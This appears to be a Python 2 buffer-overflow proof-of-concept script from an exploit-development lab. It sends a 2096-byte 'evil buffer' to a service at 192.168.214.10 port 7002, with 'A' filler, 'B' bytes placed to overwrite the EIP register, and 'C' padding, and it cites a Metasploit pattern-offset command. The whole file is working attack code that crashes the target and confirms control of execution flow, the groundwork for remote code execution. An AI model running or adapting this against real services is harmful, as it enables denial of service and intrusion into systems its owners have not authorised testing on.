#!/usr/bin/python
import socket

try:
  print "\nSending evil buffer..."

  # msf-pattern_offset -l 2096 -q 7243337
  filler = "A" * 2080
  eip = "B" * 4
  buffer = "C" * (2096 - len(filler) - len(eip))

  inputBuffer = filler + eip + buffer

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("192.168.214.10", 7002))
  s.send(inputBuffer)
  
  s.close()

  print "\nDone!"
  
except:
  print "\nCould not connect!"
